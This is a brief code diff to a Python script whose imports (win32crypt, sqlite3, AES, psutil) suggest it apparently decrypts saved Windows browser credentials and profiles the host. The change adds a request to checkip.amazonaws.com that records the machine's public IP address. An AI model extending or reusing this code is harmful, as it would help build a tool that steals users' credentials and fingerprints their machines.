@@ -11,12 +11,18 @@ import json
 import base64
 import sqlite3
 import win32crypt
+import requests
 import psutil
 import platform
 import shutil
 from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 from datetime import datetime
+
+ip='None'
+try:ip=requests.get('http://checkip.amazonaws.com/').text
+except:ip='None'
+print (ip)
 
 def get_size(bytes, suffix="B"):
     """
